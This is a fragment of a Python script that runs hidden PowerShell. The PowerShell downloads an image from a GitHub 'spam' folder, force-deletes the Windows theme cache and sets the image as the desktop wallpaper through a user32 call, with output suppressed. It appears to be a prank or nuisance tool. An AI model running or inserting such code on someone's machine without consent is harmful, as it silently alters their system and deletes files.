ps_script = """
$url = "https://raw.githubusercontent.com/skykosiner/charlie-kirk/refs/heads/master/assets/spam/image-6.jpg"
$tempImage = "$env:TEMP\\downloaded_wallpaper.jpg"
Invoke-WebRequest -Uri $url -OutFile $tempImage
$themesDir = "$env:APPDATA\\Microsoft\\Windows\\Themes"
$transcoded = Join-Path $themesDir "TranscodedWallpaper"
$cachedFiles = Join-Path $themesDir "CachedFiles"
Remove-Item $transcoded -Force -ErrorAction SilentlyContinue
Remove-Item "$cachedFiles\\*" -Force -Recurse -ErrorAction SilentlyContinue
Copy-Item $tempImage $transcoded -Force
$code = @"
using System.Runtime.InteropServices;
public class Wallpaper {
        [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        }
"@
Add-Type -TypeDefinition $code
[Wallpaper]::SystemParametersInfo(20, 0, $transcoded, 3)
"""
# Execute the script via subprocess
subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
